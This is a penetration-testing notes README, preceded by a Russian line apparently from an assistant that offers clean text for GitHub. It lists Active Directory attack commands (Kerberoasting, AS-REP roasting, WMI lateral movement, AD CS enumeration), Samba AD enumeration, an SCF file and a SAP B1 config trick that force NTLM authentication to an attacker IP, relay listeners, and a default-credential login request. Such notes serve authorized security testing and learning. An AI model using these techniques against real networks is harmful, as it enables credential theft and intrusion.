Понял тебя, без проблем. Вот **чистый текст**. Просто нажми «Копировать» и вставь в GitHub. Я убрал все лишние символы и кавычки, чтобы ты скопировал именно сам текст документа.

***

# Levon Sarkisyan | Cybersecurity Lab Notes

Welcome to my technical knowledge base. This repository contains my personal notes, research, and methodology for infrastructure penetration testing, Active Directory exploitation, and enterprise software security. 

All research is conducted in authorized lab environments or during authorized security assessments.

---

## 🔍 1. Active Directory Enumeration & Privilege Escalation

This section outlines the methodology for discovering AD misconfigurations and escalating privileges, following the MITRE ATT&CK framework.

**Initial Enumeration & BloodHound:**
```bash
# Collect data for BloodHound (Run on compromised host)
.\SharpHound.exe -c All

# Analyze paths to Domain Admin, Kerberoastable users, and unconstrained delegation
```

**Credential Access & Exploitation:**
```bash
# Kerberoasting (Find users with SPN and request TGS tickets)
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc_ip> -request

# AS-REP Roasting (Find users without Kerberos preauthentication)
impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -no-pass
```

**Lateral Movement & AD CS Exploitation:**
```bash
# Execute commands remotely via WMI
impacket-wmiexec <domain>/<admin_user>:<password>@<target_ip>

# Find vulnerable certificate templates (ESC1, ESC8, etc.)
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout
```

---

## 🐧 2. Samba AD DC: Security Research

Samba Active Directory Domain Controllers are often found in mixed Linux/Windows environments. Samba AD differs from Windows AD in its tooling and backend structure.

**Native Enumeration:**
```bash
# List domain users (requires local access or valid credentials)
samba-tool user list -H /var/lib/samba/private/sam.ldb

# List domain groups
samba-tool group listmembers "Domain Admins" -H /var/lib/samba/private/sam.ldb
```

**LDAP & ACL Analysis:**
Samba implements ACLs similarly to Windows AD. Misconfigurations can lead to privilege escalation.
- **Tooling:** Use `ldapsearch` or `ldbsearch` to query the `nTSecurityDescriptor`.
- **Impacket:** Tools like `dacledit.py` can read and modify DACLs on Samba DCs.
- **BloodHound:** SharpHound can collect data from Samba if LDAP and SMB are properly configured.

---

## 🌐 3. SMB Infrastructure Attacks (SCF & NTLM Relay)

Network shares often provide a foothold for capturing NTLM hashes or escalating privileges.

**SCF File Attack (NTLM Hash Capture):**
If a share is writable, we can drop an `.scf` file to force a victim's Windows Explorer to authenticate to our listener.
```text
[Shell]
Command=2
IconFile=\\10.10.10.10\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
*Listener setup:* `responder -I eth0 -wv` or `ntlmrelayx.py -t ldap://<dc_ip> --escalate-user <user>`

---

## 💼 4. SAP Business One Security

SAP B1 clients often store connection data insecurely on network shares. 

**PathToExcelDoc & AutoOpen.XLS Abuse:**
When a user exports data to Excel, SAP B1 uses a template file (`AutoOpen.XLS`) and reads the target path from a configuration file (`PathToExcelDoc.txt`) located in the SAP shared directory (e.g., `B1_SHF`).

*The Attack:*
1. **NTLM Capture:** Modify `PathToExcelDoc.txt` to point to a UNC path (e.g., `\\10.10.10.10\share\evil.xls`). When the SAP client opens it, it sends an NTLM hash to the attacker.
2. **RCE:** Point the file to a malicious `.xls` containing a VBA macro that downloads and executes a payload.

**SAP Service Layer (API) Attack Surface:**
SAP B1 Service Layer (usually on port 50001) can be exposed. Check for default credentials or known CVEs (e.g., Session Fixation).
```bash
# Login endpoint test
curl -X POST "http://10.10.10.10:50001/b1s/v1/Login" -H "Content-Type: application/json" -d '{"CompanyDB":"DB_NAME","UserName":"manager","Password":"password"}'
```

---
*Disclaimer: All commands, techniques, and tools documented in this repository are strictly for authorized lab environments (e.g., Hack The Box, personal labs) and authorized penetration testing engagements.*
